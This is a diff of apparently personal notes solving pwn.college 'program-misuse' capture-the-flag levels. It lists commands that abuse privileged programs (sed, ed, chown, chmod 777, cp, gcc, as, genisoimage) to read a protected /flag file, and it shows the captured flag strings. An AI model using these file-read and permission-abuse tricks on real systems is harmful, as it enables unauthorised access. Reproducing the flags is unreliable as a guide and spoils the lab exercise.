@@ -1,0 +1,35 @@
+23 genisoimage -sort /flag 
+35 sed p /flag
+36 ed /flag    p
+
+37:~$ chown hacker /flag
+hacker@program-misuse~level37:~$ cat flag
+pwn.college{Au-0dwJiWhofP26PGbXQDEtfSyM.01M2EDL1kjMzQzW}
+
+38:chmod 777 /flag 
+hacker@program-misuse~level38:~$ cat /flag 
+pwn.college{4gphmTbpEMB550GawxceTw4IvMU.0FM4EDL1kjMzQzW}
+
+
+39:~$ cp --no-preserve=mode /flag flag44
+hacker@program-misuse~level39:~$ cat flag44
+pwn.college{Yjx4H9ePWoCCxwQvaAFY6pK0fF3.0VM4EDL1kjMzQzW}
+
+
+48 gcc -L /  tes.c
+In file included from tes.c:1:
+/flag:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘.’ token
+    1 | pwn.college{ErFg-a4t70cyxqRlURF5eQEc-SS.0FM5EDL1kjMzQzW}
+      |    ^
+/flag:1:40: error: invalid suffix "FM5EDL1kjMzQzW" on floating constant
+    1 | pwn.college{ErFg-a4t70cyxqRlURF5eQEc-SS.0FM5EDL1kjMzQzW}
+      |                                        ^~~~~~~~~~~~~~~~
+
+
+
+
+
+49
+as -o test  /flag
+/flag: Assembler messages:
+/flag:1: Error: no such instruction: `pwn.college{kPpcxTBwe8wlqIGoyfi8c6JKPhu.0VM5EDL1kjMzQzW}
